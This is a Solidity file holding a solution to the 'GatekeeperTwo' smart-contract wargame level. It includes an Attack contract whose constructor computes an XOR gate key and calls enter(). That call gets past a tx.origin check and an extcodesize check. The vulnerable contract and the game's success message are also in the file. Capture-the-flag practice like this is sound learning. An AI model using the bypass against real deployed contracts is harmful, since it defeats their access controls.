// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    constructor(address _target) {
        bytes8 key = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked((address(this)))))) ^
                (type(uint64).max)
        );
        _target.call(abi.encodeWithSignature("enter(bytes8)", key));
    }
}

contract GatekeeperTwo {
    address public entrant;

    // create contract to call this contract
    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    // it about check who call this contract is human not a contract but we can bypass by creat a contract that calling this contract in constructor
    modifier gateTwo() {
        uint x;
        assembly {
            // extcodesize(a) = size of the code at address a
            // retrieve the size of the code, this needs assembly
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    /* XOR (_gateKey)
    Fomular 
    if A ^ B = C
    then C ^ B = A
    so we can use 
    A ^ C = B that mean
    bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max = uint64(_gateKey)
    */
    modifier gateThree(bytes8 _gateKey) {
        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
                uint64(_gateKey) ==
                type(uint64).max
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

/*

Result

Way to go! Now that you can get past the gatekeeper, you have what it takes to join theCyber(https://etherscan.io/address/thecyber.eth#code), 
a decentralized club on the Ethereum mainnet. Get a passphrase by contacting the creator on reddit(https://www.reddit.com/user/0age/) or via email (0age@protonmail.com) 
and use it to register with the contract at gatekeepertwo.thecyber.eth (https://etherscan.io/address/gatekeepertwo.thecyber.eth#code) 
(be aware that only the first 128 entrants will be accepted by the contract).

*/
